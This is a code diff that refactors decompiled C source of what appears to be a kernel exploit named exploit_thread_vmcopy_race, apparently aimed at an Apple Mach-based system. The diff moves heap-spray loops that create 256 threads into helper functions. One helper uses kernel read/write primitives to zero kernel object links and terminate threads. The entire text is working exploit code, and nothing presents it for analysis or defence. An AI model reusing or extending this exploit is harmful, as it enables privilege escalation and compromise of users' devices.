@@ -169,6 +169,7 @@ enum
   VMCOPY_FAKE_CONTINUATION_OFFSET = 552,
   VMCOPY_MESSAGE_KADDR_OFFSET = 664,
   VMCOPY_CAPTURED_THREAD_OFFSET = 672,
+  VMCOPY_THREAD_SPRAY_COUNT = 256,
   VMCOPY_MARKER32 = 0xC0C0C0C0u,
   VMCOPY_MARKER64 = 0xC0C0C0C0C0C0C0C0ULL,
 };
@@ -300,6 +301,33 @@ static inline void vmcopy_terminate_thread_list(thread_act_t *threads, size_t th
     thread_act_t thread = *(thread_act_t *)((char *)threads + offset);
     if ( thread )
       thread_terminate(thread);
+  }
+}
+
+static inline void vmcopy_spray_threads(thread_act_t *lastThread, unsigned int count)
+{
+  for ( unsigned int i = 0; i < count; ++i )
+    thread_create(mach_task_self_, lastThread);
+}
+
+static inline void vmcopy_spray_threads_and_clear_prev_link(
+        __int64 kreadCtx,
+        thread_act_t *lastThread,
+        unsigned int count)
+{
+  for ( unsigned int i = 0; i < count; ++i )
+  {
+    thread_create(mach_task_self_, lastThread);
+    if ( !*lastThread )
+      continue;
+
+    uint64_t threadKobject = get_task_kobject_addr_from_field32(kreadCtx, *lastThread);
+    if ( validate_kaddr_range(*(uint64_t *)(kreadCtx + 32), threadKobject) )
+    {
+      kwrite_u64_to_addr(kreadCtx, threadKobject + qword_48008 - 8, 0);
+      thread_terminate(*lastThread);
+      *lastThread = 0;
+    }
   }
 }
 
@@ -7920,7 +7948,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   bool v17; // cf
   unsigned int v19; // w0
   unsigned __int64 v20; // x27
-  int v21; // w21
   thread_act_t v22; // w1
   unsigned __int64 v23; // x25
   __int64 v24; // x22
@@ -7948,8 +7975,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   __int64 v58; // x9
   unsigned __int64 v59; // x9
   int v60; // w10
-  int v61; // w24
-  unsigned __int64 v62; // x22
   unsigned int v63; // w0
   unsigned __int64 v64; // x22
   unsigned __int64 v65; // x25
@@ -8081,13 +8106,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   kwrite_u64_to_addr(*v2, v3 + 24, 0);
   kwrite_u64_to_addr(*v2, v3 + 32, -16384);
   v154 = 0;
-  v21 = 256;
-  do
-  {
-    thread_create(mach_task_self_, &v154);
-    --v21;
-  }
-  while ( v21 );
+  vmcopy_spray_threads(&v154, VMCOPY_THREAD_SPRAY_COUNT);
   v107 = 0;
   target_act = 0;
   v103 = v5 + 48;
@@ -8226,23 +8245,7 @@ LABEL_68:
       if ( (v60 & 0x8000) == 0 )
         *(uint32_t *)(v152 + v59) = v60 | 0x8000;
     }
-    v61 = 256;
-    do
-    {
-      thread_create(mach_task_self_, &v154);
-      if ( v154 )
-      {
-        v62 = get_task_kobject_addr_from_field32(*v2, v154);
-        if ( validate_kaddr_range(*(uint64_t *)(*v2 + 32), v62) )
-        {
-          kwrite_u64_to_addr(*v2, v62 + qword_48008 - 8, 0);
-          thread_terminate(v154);
-          v154 = 0;
-        }
-      }
-      --v61;
-    }
-    while ( v61 );
+    vmcopy_spray_threads_and_clear_prev_link(*v2, &v154, VMCOPY_THREAD_SPRAY_COUNT);
     kwrite_u64_to_addr(*v2, v23 + qword_48008 - 8, v100);
     kwrite_u64_to_addr(*v2, qword_48008 + v23, v96);
     v63 = kread_u32_value(*v2, v20);
